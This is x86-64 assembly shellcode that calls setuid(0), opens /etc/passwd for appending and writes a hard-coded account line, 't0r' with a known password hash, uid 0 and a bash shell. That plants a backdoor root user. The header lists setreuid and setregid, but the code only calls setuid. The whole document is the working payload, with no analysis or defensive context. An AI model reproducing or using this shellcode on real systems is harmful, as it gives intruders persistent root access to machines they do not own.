; Author: Bobby Cooke
;Purpose:       adds user "t0r" with password "Winner" to /etc/passwd
;executed syscalls:     setreuid, setregid, open, write, close, exit
;Result:        t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash
_start:
;sys_setuid(0)
xor rdi, rdi   ;arg 1 -- set uid to root (0)
mul rdi
push rdi
pop rsi
mov al, 0x69   ;syscall setuid
syscall

; int open(const char *pathname, int flags);
jmp short callFileString
popFileString:
pop rdi                  ; ARG1 - pointer to "/etc/passwd"
mov [rdi+0xB], dl        ; Null terminator byte for string

mov si, 0x441            ; ARG2 - flags to open and write
mov al, 2                ; open syscall
syscall                  ; rax=fd for opened file

;sys_write(uint fd, char* buf, uint size)
; rax=0x1   rdi=fd  rsi=&str   rdx=0x26
jmp short callPasswdString
popPasswdString:
pop rsi                  ; ARG2 - &passwdString
mov [rsi+0x26], dl       ; Null terminator byte for string
push rax
pop rdi                  ; ARG1 - fd
add rdx, 0x26            ; ARG3 - len(passwdString)
xor rax, rax
inc rax                  ; 0x1 = write systemcall
syscall

;;close(fd)
xor rax, rax             ; rdi is already the file descriptor
add al, 3                ; 0x3 = close systemcall
syscall

;;sys_exit(int err_code)
xor rax, rax
mov al, 0x3C             ; 0x3C = exit systemcall
xor rdi, rdi             ; ARG1 = Error Code = 0x0
syscall

callFileString:
call popFileString
fileString: db "/etc/passwdA"
callPasswdString:
call popPasswdString
passwdString: db "t0r:3UgT5tXKUkUFg:0:0::/root:/bin/bash"
